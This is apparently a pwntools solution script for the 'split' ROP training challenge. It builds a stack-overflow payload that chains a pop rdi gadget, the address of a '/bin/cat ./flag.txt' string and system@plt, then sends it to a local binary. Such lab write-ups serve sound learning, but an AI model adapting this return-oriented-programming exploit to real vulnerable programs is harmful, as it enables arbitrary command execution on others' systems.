#!/usr/bin/env python3
from pwn import *
"""
- usefulFunction() has _system() call 
- pointer of "/bin/cat ./flag.txt" @.data:0000000000601060	

chain could be:
	pop rdi; ret
	cat_flag ??
	system

Do not need to call "usefulFunction". It just imports useful calls

0x0000000000400560  system@plt
0x00007ffff7e10c30  __libc_system
0x00007ffff7e10c30  system
0x00007ffff7f102e0  svcerr_systemerr

"""

system = 0x0000000000400560  

rsp_offset = 0x20
pop_rdi = 0x00000000004007c3
cat_flag = 0x0000000000601060
ret = 0x000000000040053e

context.update(arch="amd64",os="linux")
p = process("./split")
#gdb.attach(p)

payload = b"\x90" * rsp_offset + (b"\x90\x90\x90\x90" * 2)
payload += p64(pop_rdi) 
payload += p64(cat_flag)

payload += p64(ret)
payload += p64(system)

p.send(payload)
p.recvall()
